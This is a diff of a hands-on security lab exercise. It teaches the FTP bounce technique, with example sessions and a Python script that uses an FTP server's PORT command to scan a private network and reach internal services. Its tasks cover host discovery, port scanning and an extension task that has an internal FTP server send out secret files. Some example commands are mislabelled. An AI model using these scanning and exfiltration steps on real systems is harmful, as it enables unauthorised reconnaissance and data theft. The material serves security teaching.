@@ -8,6 +8,9 @@ In Exercise 1 we scanned a publicly-accessible server, and discovered it was run
 exercise we're going to abuse that FTP server to reconnoiter the private network it is connected to. Then
 we'll see if we can do anything useful to an attacker.
 
+``nmap`` is software built specifically for Network Scanning. Here we're repurposing legitimate services to
+scan networks we otherwise could not access.
+
 For the purposes of this Exercise we have revived a security issue from the mid-90s, where people started to
 use a design quirk of the FTP protocol in this manner. Modern exploits can deliver similar capabilities but
 tend to be much more complex, which would complicate this simple example.
@@ -16,63 +19,95 @@ tend to be much more complex, which would complicate this simple example.
 Design of The FTP Protocol
 ------------------------------------------------------------
 
-This gives a qualitative explanation of what FTP is and how it works. For full details (potentially useful
-for the Tasks below) see the :ref:`ref_ftp_reference`.
-
 FTP stands for File Transfer Protocol. It dates from 1971 but is still in widespread use. It is a standard
 for sharing files over the Internet - very much an old version of Dropbox or Google Drive. A typical session consists of an FTP client connecting to an FTP server on port 21. It then sends a login, e.g.
 ``USER student`` and ``PASS golyeeHug6``.
 
-Provided the server accepts these details, the client can then send commands. Such as deleting a file,
-``DELE file.txt``. They can also get data from the server. For commands which return data, such as a list of
-files in the current directory or the contents of a file, FTP uses a separate connection to send that data.
+Provided the server accepts these details, the client can then send commands. Such as deleting a file with
+``DELE file.txt``. If the deletion was successful, the server responds with a ``250 DELE command successful``
+message.
 
-The Client sends ``PORT A,B,C,D,P1,P2`` to indicate the IP Address A.B.C.D and Port P1P2 that the server can
-open the data connection to. Then the client can ask for a file list by sending ``LIST``. Or download a file
-by sending ``RETR file2.txt``. Or upload a file by sending ``STOR file3.txt``. In that last case, the server
-opens the Data connection and the client sends the data along it.
+************************************************************
+Data Connections
+************************************************************
 
-This feature also allows you to access services on the same private network as the FTP Server. You can
-specify any IP address and port in the ``PORT`` command - including ones you can't access on its local
-private network. Such as ``192.168.56.102``, which is in the private subnet.
+The ``DELE`` command results in a simple success or failure message. But if you're downloading or uploading
+file contents, FTP sends that data over a separate connection.
 
-Usefully for network scanning, the FTP Server tells you over the command port whether it was able to
-establish a data connection or not. But that's after opening a TCP connection and sending data that might
-be the contents of a file you uploaded.
+1. The Client sends ``PORT A,B,C,D,P1,P2`` to indicate the IP Address A.B.C.D and Port P1P2 that the server
+   could open a data connection to.
+2. The Client then sends a command which requires a data connection. Such as ``LIST`` for a list of files in
+   the current directory. Or ``RETR file2.txt`` to get the contents of the file ``file2.txt``. Or
+   ``STOR file3.txt`` to upload a file.
+3. The Server connects to the address specified by the previous ``PORT`` command, sends the data, and closes
+   the connection. For file uploads, the Server opens the connection and the client sends data and closes it.
 
-[EXCERPT]
+.. _ref_exercise2_ftp_bounce:
 
-FTP Bounce lets you send chosen TCP data to a specified IP Address and Port, and tells you whether a
-connection could be established. This lets you do lots of things useful for learning about someone's
-network:
+************************************************************
+FTP Bounce
+************************************************************
+
+There was no requirement for that ``PORT`` command to go to the Client's IP Address. You could send file
+contents anywhere the FTP Server could access. If the FTP server was connected to a private network, such
+as a home or corporate network, you could send data to hosts on that network.
+
+This tells you there isn't an FTP server running on 192.168.56.102::
+
+    Client: PORT 192,168,56,102,0,21
+    Server: 200 PORT command successful
+
+    Client: RETR evil_ftp_commands.txt
+    Server: 425 Unable to build data connection: Connection refused
+    Server: 450 LIST: Connection refused
+
+This tells you there is an FTP server running on 192.168.56.103::
+
+    Client: PORT 192,168,56,103,0,21
+    Server: 200 PORT command successful
+
+    Client: RETR evil_ftp_commands.txt
+    Server: 150 Opening ASCII mode data connection for file list
+    Server: 226 Transfer complete
+
+You just sent the contents of ``evil_ftp_commands.txt`` to the FTP server on 192.168.56.103, and it will run
+the contents as FTP commands. If you include a ``PORT`` command pointing to you, you can even have that FTP
+Server send you a list of files or their contents.
+
+This technique is named FTP Bounce, as you're bouncing requests off the FTP Server. With it you could:
 
 * Discover their internal servers.
 * Enumerate which services are running.
 * Interact with internal, private FTP servers.
 * Send commands to some shells and databases, but generally not read the output.
 
+For the following tasks, you will find this useful: :ref:`ref_ftp_reference`
+
 ------------------------------------------------------------
 Task 1: Experiment with FTP
 ------------------------------------------------------------
 
 In ``ftp/examples`` you'll find a number of Python scripts. These are examples of how to do various
-operations, as explained in `the FTP reference <ftp-reference.html#a-short-incomplete-but-useful-command-reference>`_.
+operations, as explained in :ref:`ref_ftp_reference`
 
-::
+1. Try saving some text as a file::
 
-    # Try uploading a file.
-    python3 examples/stor.py
+    examples/stor.py
 
-    # Try listing files in the current directory.
+2. Try listing files in the current directory::
+
     python3 examples/retr.py
 
-    # Try retrieving a file.
+3. Try retrieving a file::
+
     python3 examples/retr.py
 
-    # Try deleting a file.
+4. Try deleting a file::
+
     python3 examples/retr.py
 
-    # Try sending data to a another service.
+5. Try sending data to a another service::
+
     python3 examples/remote_port.py
 
 You'll notice these examples all print the commands moving back and forth. This is controlled by a
@@ -83,31 +118,63 @@ work.
 Task 2: Discover hosts on the internal network
 ------------------------------------------------------------
 
-Try adapting ``examples/remote_port.py`` to send data to port 22 of each IP Address on ``192.168.X.X``. So
-you'll want to iterate through ``192.168.0.1``, …, ``192.168.0.255``, ``192.168.1.0``, …, ``192.168.1.255``,
-…, ``192.168.255.255``. Make a list of which IP Addresses did connect, as these are the hosts on their
-private network.
+This is the provided ``examples/remote_port.py``::
+
+    import sys, os
+    sys.path.append(os.path.dirname(os.path.abspath(__file__)) + "/..")
+    from cp_ftp import FTP
+
+    ftp = FTP("192.168.56.101", debug=True)
+    ftp.send_login_commands("student", "golyeeHug6")
+
+    target_address = ("192.168.56.103", 21)
+    ftp.send_port_command(target_address)
+    response = ftp.recv_response()
+    if response.code != 200:
+      print(response)
+      sys.exit(1)
+
+    ftp.send_command("LIST")
+    response = ftp.recv_response()
+    if response.code != 150:
+      print(response)
+      sys.exit(1)
+
+    # No Data is received because it was sent somewhere besides this program!
+    response = ftp.recv_response()
+    if response.code != 226:
+      print(response)
+      sys.exit(1)
+
+    ftp.close()
+
+We'd like to quickly discover all hosts running on the ``192.168.0.X`` subnet. We could try every port on
+every host ``192.168.0.1`` through ``192.168.0.255``, but that's ``255 * 65,536 = 16,711,680`` attempts.
+
+To keep things quick, just check port ``22`` on each of those IP Addresses. To make things quicker, only scan
+from ``192.168.0.101`` to ``192.168.0.132``.
+
+Make a list of which IP Addresses connect successfully.
+
+Hint: You can see the difference between successful/unsuccessful under :ref:`ref_exercise2_ftp_bounce`. See whether code 150 was recieved.
+
+Hint: use a new ``FTP`` instance each time, and loop over each IP Address.
 
 ------------------------------------------------------------
 Task 3: Port scan discovered hosts
 ------------------------------------------------------------
 
-Now you're going to find what TCP services are running on a machine on the FTP Server's private network.
-Namely on ``192.168.56.102``. To do this, you'll want to detect successful vs unsuccessful openings of the
-data connection.
+Now you want to find out which services are running on the hosts we discovered. You can do this by trying
+each port from ``1`` to ``65,535``.
 
-Use the code from ``python3 examples/remote_port.py`` to access port ``22`` on ``192.168.56.102``, where SSH
-will be running. Note down the final response you get. Then try a random high port (e.g. 34989) and see what
-the response is when nothing is on that port.
-
-Now go try this for all ports from 1 to 65,535. Try searching what those port numbers correspond to, if
-anything. You can also use the ``RETR`` command to read anything the service outputs upon connecting into
-a file on the FTP server.
+To keep things quick, only try privileged ports (those from ``1`` to ``1023``).
 
 You should start to sense how you discover what is running, and get to look for options for attack.
 
+You may also be save the output from each service onto a file on the file on the FTP Server, using ``RETR``.
+
 ------------------------------------------------------------
-Task 4: Exfiltrate data from a private FTP server
+Extension Task: Exfiltrate data from a private FTP server
 ------------------------------------------------------------
 
 For our next task we want to retrieve secret files from this network's private FTP server. You may have
@@ -119,4 +186,9 @@ Here's the trick: you can send the contents of a file to the FTP server on port 
 it'll interpret each line of the contents as a command. So you can tell it to do things. Like send you their
 secret weapon blueprints.
 
-`Conclusion → <conclusion.html>`_
+You could put a ``PORT`` command corresponding to a ``new_data_address`` into that file, then put ``LIST``.
+Then the ``192.168.56.102`` FTP server will send your computer a list of files you can get with ``ftp.recv_data()``.
+
+This is actually quite tricky to do with limited knowledge. But if you get it working, congratulations!
+
+:ref:`ref_conclusion`
